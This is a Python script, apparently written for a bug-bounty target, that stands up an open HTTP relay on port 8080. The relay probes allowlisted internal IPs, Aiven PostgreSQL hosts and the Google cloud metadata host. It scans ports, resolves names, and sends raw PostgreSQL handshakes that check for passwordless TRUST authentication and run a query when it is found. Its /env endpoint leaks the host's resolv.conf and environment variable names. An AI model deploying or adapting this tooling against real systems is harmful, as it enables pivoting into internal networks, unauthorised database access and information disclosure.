import http.server, json, socket, ssl, struct, urllib.parse, time

ALLOW_HOSTS = {
 "falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com","129.213.97.171",
 "10.1.0.204","10.1.47.111","172.31.28.65",
 "fda7:a938:5bfe:5fa6:0:5e4:c451:eba9",
 "public-falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com",
 "dr-public-falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com",
 "dr-falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com",
 "n-falcon-bug-bounty-flag-pgsql-4.e.aivencloud.com",
 "falcon-bug-bounty-flag-pgsql-4.dev-sandbox.aiven.local",
 "replica-falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com",
 "12691.local","metadata.google.internal",
}
ALLOW_PORTS = {22,53,80,443,5432,8080,8443,9090,9200,12691,12692,13988,13989,19000,19102,21911,21912,9701,9680,9955,9700,6432,5000}

def tcp_probe(host, port, t=5):
    if host not in ALLOW_HOSTS: return "REFUSED host"
    if port not in ALLOW_PORTS: return "REFUSED port"
    t0=time.time()
    try:
        s=socket.create_connection((host,port),timeout=t); s.settimeout(2)
        try: b=s.recv(80)
        except Exception: b=b""
        s.close()
        return f"OPEN {int((time.time()-t0)*1000)}ms banner={b[:40]!r}"
    except Exception as e:
        return f"{type(e).__name__}: {str(e)[:80]} ({int((time.time()-t0)*1000)}ms)"

def pg_probe(host, port, user, db, t=8):
    if host not in ALLOW_HOSTS: return "REFUSED host"
    if port not in ALLOW_PORTS: return "REFUSED port"
    out={"host":host,"port":port,"user":user,"db":db}
    try:
        raw=socket.create_connection((host,port),timeout=t)
        raw.sendall(struct.pack("!II",8,80877103))
        r=raw.recv(1)
        if r!=b"S": return {"error":f"ssl-refused {r!r}"}
        ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
        s=ctx.wrap_socket(raw,server_hostname=host)
        ps=b"user\x00"+user.encode()+b"\x00database\x00"+db.encode()+b"\x00\x00"
        s.sendall(struct.pack("!I",8+len(ps))+struct.pack("!I",196608)+ps)
        hdr=s.recv(5)
        if len(hdr)<5: return {"error":"eof-after-startup","hdr":hdr.hex()}
        mtype=hdr[0:1]; ln=struct.unpack("!I",hdr[1:5])[0]
        body=s.recv(ln-4) if ln>4 else b""
        if mtype==b"R" and len(body)>=4:
            code=struct.unpack("!I",body[:4])[0]
            names={0:"TRUST",2:"KERBEROS",3:"CLEARTEXT",5:"MD5",7:"GSS",8:"SSPI",10:"SASL",11:"SASL_CONTINUE",12:"SASL_FINAL"}
            out["auth"]=names.get(code,code)
            if code==10:
                mechs=[m.decode() for m in body[4:].split(b"\x00") if m]
                out["mechs"]=mechs
            if code==0:
                # TRUST! read params and run query
                params={}
                for _ in range(12):
                    s.settimeout(3)
                    try: h2=s.recv(5)
                    except Exception: break
                    if len(h2)<5: break
                    l2=struct.unpack("!I",h2[1:5])[0]
                    b2=s.recv(l2-4)
                    if h2[0:1]==b"S":
                        parts=b2.split(b"\x00"); params[parts[0].decode()]=parts[1].decode(errors="replace") if len(parts)>1 else ""
                    if h2[0:1]==b"Z": break
                out["params"]=params
                q=b"Q\x00"+struct.pack("!I",4+1)+b"SELECT version()\x00"
                s.sendall(struct.pack("!I",len(q)+4)+q)
                s.settimeout(5)
                rows=[]
                for _ in range(6):
                    try: h3=s.recv(5)
                    except Exception: break
                    if len(h3)<5: break
                    l3=struct.unpack("!I",h3[1:5])[0]; b3=s.recv(l3-4)
                    if h3[0:1]==b"T": out["rowdesc"]=b3[:120].decode(errors="replace")
                    elif h3[0:1]==b"D": rows.append(b3.decode(errors="replace"))
                    elif h3[0:1]==b"E": out["qerr"]=b3[:200].decode(errors="replace")
                    elif h3[0:1]==b"Z": break
                out["rows"]=rows
        elif mtype==b"E":
            out["error"]=body.decode(errors="replace")[:300]
        else:
            out["msg"]=repr(mtype); out["body"]=body[:120].decode(errors="replace")
        s.close()
        return out
    except Exception as e:
        out["exc"]=f"{type(e).__name__}: {e}"
        return out

def dns_probe(name):
    if name not in ALLOW_HOSTS: return "REFUSED name"
    try:
        return [ai[4][0] for ai in socket.getaddrinfo(name,None)][:4]
    except Exception as e:
        return f"{type(e).__name__}: {e}"

class H(http.server.BaseHTTPRequestHandler):
    def _send(self,obj):
        b=json.dumps(obj,indent=1,default=str).encode()
        self.send_response(200); self.send_header("Content-Type","application/json")
        self.send_header("Content-Length",str(len(b))); self.end_headers(); self.wfile.write(b)
    def do_GET(self):
        u=urllib.parse.urlparse(self.path); q=urllib.parse.parse_qs(u.query)
        if u.path=="/tcp":
            self._send({"r":tcp_probe((q.get("host") or [""])[0], int((q.get("port") or ["0"])[0]))})
        elif u.path=="/pg":
            self._send(pg_probe((q.get("host") or [""])[0], int((q.get("port") or ["12691"])[0]),
                                (q.get("user") or ["postgres"])[0], (q.get("db") or ["postgres"])[0]))
        elif u.path=="/dns":
            self._send({"name":(q.get("name") or [""])[0], "r":dns_probe((q.get("name") or [""])[0])})
        elif u.path=="/env":
            import os
            self._send({"host":socket.gethostname(),
                        "dns":open("/etc/resolv.conf").read() if os.path.exists("/etc/resolv.conf") else "",
                        "env_keys":sorted(os.environ)[:40]})
        else:
            self._send({"endpoints":"/tcp /pg /dns /env"})
    def log_message(self,*a): pass

http.server.HTTPServer(("0.0.0.0",8080),H).serve_forever()
